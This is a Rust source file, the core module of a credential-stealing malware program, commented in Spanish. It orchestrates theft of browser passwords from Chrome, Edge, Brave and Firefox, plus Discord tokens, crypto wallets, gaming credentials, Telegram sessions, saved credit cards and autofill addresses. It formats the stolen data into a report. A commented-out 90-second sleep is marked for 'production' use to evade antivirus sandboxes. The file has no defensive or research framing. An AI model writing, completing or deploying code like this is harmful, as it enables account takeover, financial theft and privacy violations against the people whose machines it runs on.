// Módulo de robo de credenciales de browsers
pub mod chromium;
pub mod firefox;
pub mod discord;
pub mod wallets;
pub mod gaming;
pub mod telegram;
pub mod autofill;
pub mod common;

use std::error::Error;
use std::fmt;

#[derive(Debug)]
pub enum StealerError {
    BrowserNotFound,
    DecryptionFailed,
    DatabaseError(String),
    IoError(String),
    Base64Error,
    InvalidData,
}

impl fmt::Display for StealerError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        match self {
            StealerError::BrowserNotFound => write!(f, "Browser no encontrado"),
            StealerError::DecryptionFailed => write!(f, "Error al desencriptar"),
            StealerError::DatabaseError(e) => write!(f, "Error de base de datos: {}", e),
            StealerError::IoError(e) => write!(f, "Error de I/O: {}", e),
            StealerError::Base64Error => write!(f, "Error decodificando Base64"),
            StealerError::InvalidData => write!(f, "Datos inválidos"),
        }
    }
}

impl Error for StealerError {}

pub type StealerResult<T> = Result<T, StealerError>;

/// Credencial robada de un browser
#[derive(Debug, Clone)]
pub struct Credential {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String,
}

impl Credential {
    pub fn to_string(&self) -> String {
        format!(
            "[{}]\nURL: {}\nUser: {}\nPass: {}\n",
            self.browser, self.url, self.username, self.password
        )
    }
}

/// Estructura para datos robados (credenciales + tokens + wallets + gaming + telegram + autofill)
#[derive(Debug)]
pub struct StolenData {
    pub credentials: Vec<Credential>,
    pub discord_tokens: Vec<discord::DiscordToken>,
    pub wallets: Vec<wallets::WalletData>,
    pub gaming: Vec<gaming::GamingData>,
    pub telegram: Vec<telegram::TelegramSession>,
    pub credit_cards: Vec<autofill::CreditCard>,
    pub addresses: Vec<autofill::AutofillAddress>,
    pub debug_log: String,  // 🔍 Debug logs para diagnóstico
}

impl StolenData {
    pub fn new() -> Self {
        Self {
            credentials: Vec::new(),
            discord_tokens: Vec::new(),
            wallets: Vec::new(),
            gaming: Vec::new(),
            telegram: Vec::new(),
            credit_cards: Vec::new(),
            addresses: Vec::new(),
            debug_log: String::new(),
        }
    }
    
    pub fn is_empty(&self) -> bool {
        self.credentials.is_empty() && 
        self.discord_tokens.is_empty() && 
        self.wallets.is_empty() &&
        self.gaming.is_empty() &&
        self.telegram.is_empty() &&
        self.credit_cards.is_empty() &&
        self.addresses.is_empty()
    }
    
    pub fn total_count(&self) -> usize {
        self.credentials.len() + 
        self.discord_tokens.len() + 
        self.wallets.len() +
        self.gaming.len() +
        self.telegram.len() +
        self.credit_cards.len() +
        self.addresses.len()
    }
    
    pub fn to_string(&self) -> String {
        let mut output = String::new();
        
        // 🔍 DEBUG: Mostrar logs de diagnóstico al principio
        if !self.debug_log.is_empty() {
            output.push_str("\n🔍 DEBUG LOG (Credit Cards)\n");
            output.push_str("═══════════════════════════════════════\n");
            output.push_str(&self.debug_log);
            output.push_str("\n═══════════════════════════════════════\n");
        }
        
        // Credenciales de browsers
        if !self.credentials.is_empty() {
            output.push_str(&format!("\n🌐 BROWSER CREDENTIALS ({})\n", self.credentials.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, cred) in self.credentials.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&cred.to_string());
            }
        }
        
        // Discord tokens
        if !self.discord_tokens.is_empty() {
            output.push_str(&format!("\n\n💬 DISCORD TOKENS ({})\n", self.discord_tokens.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, token) in self.discord_tokens.iter().enumerate() {
                output.push_str(&format!("[#{}] {}\n", idx + 1, token.to_string()));
            }
        }
        
        // Crypto Wallets
        if !self.wallets.is_empty() {
            output.push_str(&format!("\n\n💰 CRYPTO WALLETS ({})\n", self.wallets.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, wallet) in self.wallets.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&wallet.to_string());
            }
        }
        
        // Gaming Credentials
        if !self.gaming.is_empty() {
            output.push_str(&format!("\n\n🎮 GAMING CREDENTIALS ({})\n", self.gaming.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, game) in self.gaming.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&game.to_string());
            }
        }
        
        // Telegram Sessions
        if !self.telegram.is_empty() {
            output.push_str(&format!("\n\n💬 TELEGRAM SESSIONS ({})\n", self.telegram.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, session) in self.telegram.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&session.to_string());
            }
        }
        
        // Credit Cards
        if !self.credit_cards.is_empty() {
            output.push_str(&format!("\n\n💳 CREDIT CARDS ({})\n", self.credit_cards.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, card) in self.credit_cards.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&card.to_string());
            }
        }
        
        // Autofill Addresses
        if !self.addresses.is_empty() {
            output.push_str(&format!("\n\n📍 AUTOFILL ADDRESSES ({})\n", self.addresses.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, address) in self.addresses.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&address.to_string());
            }
        }
        
        output
    }
}

/// Ejecuta el robo de credenciales de todos los browsers y Discord
pub fn steal_all() -> StolenData {
    // ═══════════════════════════════════════════════════════════════
    // 🛡️ SANDBOX EVASION - Sleep 90 segundos (COMENTADO PARA TESTING)
    // ═══════════════════════════════════════════════════════════════
    // Los sandboxes de AV tienen timeout de 30-60 segundos.
    // Si el malware no hace nada sospechoso en ese tiempo, pasa la detección.
    // DESCOMENTAR PARA PRODUCCIÓN:
    /*
    #[cfg(target_os = "windows")]
    {
        use std::thread;
        use std::time::Duration;
        thread::sleep(Duration::from_secs(90));
    }
    */
    // ═══════════════════════════════════════════════════════════════
    
    let mut data = StolenData::new();

    // Chromium-based browsers
    if let Ok(mut chrome_creds) = chromium::steal_chrome() {
        data.credentials.append(&mut chrome_creds);
    }
    
    if let Ok(mut edge_creds) = chromium::steal_edge() {
        data.credentials.append(&mut edge_creds);
    }
    
    if let Ok(mut brave_creds) = chromium::steal_brave() {
        data.credentials.append(&mut brave_creds);
    }

    // Firefox
    if let Ok(mut firefox_creds) = firefox::steal_firefox() {
        data.credentials.append(&mut firefox_creds);
    }
    
    // Discord tokens
    if let Ok(mut tokens) = discord::steal_discord_tokens() {
        data.discord_tokens.append(&mut tokens);
    }
    
    // Crypto Wallets
    let mut wallet_data = wallets::steal_wallets();
    data.wallets.append(&mut wallet_data);
    
    // Gaming Credentials
    let mut gaming_data = gaming::steal_gaming_data();
    data.gaming.append(&mut gaming_data);
    
    // Telegram Sessions
    let mut telegram_data = telegram::steal_telegram_sessions();
    data.telegram.append(&mut telegram_data);
    
    // Credit Cards
    let mut credit_cards = autofill::steal_credit_cards();
    data.credit_cards.append(&mut credit_cards);
    
    // 🔍 DEBUG: Leer log file si existe
    let debug_log_path = std::env::temp_dir().join("stealer_debug.txt");
    data.debug_log.push_str(&format!("🔍 DEBUG: Buscando log en: {:?}\n", debug_log_path));
    data.debug_log.push_str(&format!("🔍 DEBUG: Archivo existe: {}\n", debug_log_path.exists()));
    
    if debug_log_path.exists() {
        match std::fs::read_to_string(&debug_log_path) {
            Ok(log_content) => {
                data.debug_log.push_str("🔍 DEBUG: Log leído correctamente\n");
                data.debug_log.push_str("════════════════════════════════\n");
                data.debug_log.push_str(&log_content);
                data.debug_log.push_str("════════════════════════════════\n");
                // Eliminar archivo después de leerlo
                let _ = std::fs::remove_file(&debug_log_path);
            },
            Err(e) => {
                data.debug_log.push_str(&format!("🔍 DEBUG: Error leyendo log: {}\n", e));
            }
        }
    } else {
        data.debug_log.push_str("🔍 DEBUG: Archivo de log no existe\n");
        data.debug_log.push_str("🔍 DEBUG: Esto significa que steal_credit_cards() no escribió nada\n");
    }
    
    // Autofill Addresses
    let mut addresses = autofill::steal_autofill_addresses();
    data.addresses.append(&mut addresses);

    data
}
